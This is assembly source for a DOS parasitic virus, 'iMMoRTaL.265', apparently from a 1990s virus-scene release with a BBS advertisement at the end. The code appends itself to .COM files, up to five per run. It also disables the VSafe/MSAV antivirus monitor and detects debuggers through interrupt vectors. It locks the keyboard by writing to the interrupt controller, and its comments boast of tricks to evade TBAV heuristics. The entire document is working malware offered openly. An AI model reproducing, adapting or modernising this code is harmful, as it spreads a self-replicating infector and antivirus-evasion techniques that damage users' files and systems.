﻿

%OUT iMMoRTaL.265 virus by Immortal EAS.
%OUT Little parasatic non-tsr appending virus. Features:
%OUT  + Anti-tracing meganism
%OUT  + 13% chance on a keyboard lock
%OUT  + 50% chance on a little message
%OUT  + Quick spreading routine, 5 infects per run
%OUT AV Fool techniques:
%OUT  + VSafe takedown  (!!)
%OUT  + Simple but working version to get Delta Offset  ("E?!?")
%OUT  + Z.COM filespec will be changed to *.COM  ("S")
%OUT  + "F" simply does not appear (!?!)
%OUT btw. TBAV heuristic scan "G" disappears after infection!?!

.model  tiny
.code
	
	ORG     100h                    ;COM file remember?!?

start:  push    bx                      ;Some junk to fool TBAV
	pop     ax
	
	mov     ax,0fa01h               ;Let's take down MSAV!!!
	mov     dx,05945h
	int     16h
	
	call    getdlt                  ;Nice way to get delta offset!
realst:
getdlt: pop     bp
	sub     bp, offset getdlt

codest: lea     si,[orgbts+bp]          ;Restore first 4 bytes        
	mov     di,0100h
	movsw
	movsw
	
	push    cs                      ;DS <==> CS
	pop     ds
	
	lea     dx,[eov+bp]             ;Set DTA address
	mov     ah,1ah
	int     21h
	
	mov     al,01h                  ;Detect INT 1 trace...
	mov     ah,35h
	int     21h
	push    es
	pop     ax
	cmp     ax,70h                  ;Default segment INT 1 & 3
	jne     lockkb
	
	mov     al,03h                  ;Detect INT 3 trace...
	mov     ah,35h
	int     21h
	push    es
	pop     ax
	cmp     ax,70h                  ;Default segment INT 1 & 3
	jne     lockkb
	
	mov     ah,2ch                  ;13% chance to lock keyboard!
	int     21h
	cmp     dl, 0dh
	jg      nolock

lockkb: mov     al,82h                  ;Actual keyboard lock!
	out     21h,al
	
nolock: mov     ah,2ch                  ;50% chance to print message!
	int     21h
	cmp     dl,32h
	jl      spread

	mov     ah,09h                  ;Bingo! print message!
	lea     dx, [bp+offset welcome]
	int     21h
	mov     ah,00h                  ;Wait for a key!
	int     16h
	jmp     spread
			
welcome db 'iMMoRTaL.263!!',07h,0ah,0dh,'$';Ever seen a DB in the middle of a file?

spread: mov     ah,4eh                  ;Findfirst
	lea     dx,[fspec+bp]           ;Filespec=*.COM
	
	mov     byte ptr [infcnt+bp],0
fnext:  add     byte ptr [infcnt+bp],1
	cmp     byte ptr [infcnt+bp],6
	je      re_dta
	
	mov     byte ptr [fspec+bp],'*'
	int     21h
	jc      re_dta                  ;No files found
	mov     byte ptr [fspec+bp],'z'
	lea     dx,[eov+1eh+bp]         ;Open file
	mov     ax,3d02h
	int     21h

	jc      nextf                   ;Error opening file, next!

	xchg    bx,ax

	mov     cx,0004h                ;Read first 4 bytes for check
	mov     ah,3fh                  ; if already infected!
	lea     dx,[orgbts+bp]
	int     21h

	cmp     byte ptr [orgbts+bp+3],'I' ;Already infected
	jz      shutit

	mov     ax,4202h                ;Goto eof
	sub     cx,cx                   ;2 byte version of mov cx,0!!
	cwd                             ;1 byte version of mov dx,0!!
	int     21h

	sub     ax,0003h                ;Use our jmp table
	mov     word ptr [bp+jmptbl+1],ax

	mov     ah,40h                  ;Implend our viral code into victim
	mov     cx,eov-start
	lea     dx,[bp+start]
	int     21h

	mov     ax,4200h                ;Goto SOF
	sub     cx,cx
	cwd
	int     21h

	mov     ah,40h                  ;Write first four bytes over
	mov     cx,0004h                ; the original
	lea     dx,[bp+jmptbl]
	int     21h

shutit: mov     ah,3eh                  ;Close victim
	int     21h

nextf:  mov     ah,4fh                  ;Find next file
	jmp     fnext

re_dta: mov     ah,1ah                  ;Reset DTA
	mov     dx,0080h
	int     21h

	mov     di,0100h                ;Return control to original file!
	push    di
	ret


fspec   db      'z.com',0
infcnt  db      0
jmptbl  db      0e9h,00h,00h,'I'
orgbts: db      90h,90h,90h,90h
eov:
end     start

; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ Remember Where You Saw This Phile First ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; ÄÄÄÄÄÄÄÄ[=] ARRESTED DEVELOPMENT +31.77.547477 The Netherlands [=]ÄÄÄÄÄÄÄ
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

</==>